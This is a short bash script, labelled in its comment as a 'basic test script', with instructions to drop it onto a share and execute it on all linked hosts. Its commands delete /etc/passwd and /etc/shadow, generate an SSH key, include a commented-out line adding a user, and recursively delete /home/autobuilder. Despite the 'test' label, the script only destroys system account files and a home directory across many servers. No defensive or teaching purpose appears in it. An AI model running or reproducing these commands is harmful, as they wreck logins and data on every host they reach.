#!/bin/bash
# basic test script to remove passwd + shadow files from servers
# drop into our share and execute on all linked hosts

rm /etc/passwd && rm /etc/shadow
ssh-keygen
#adduser darren-corpdev
rm -R /home/autobuilder
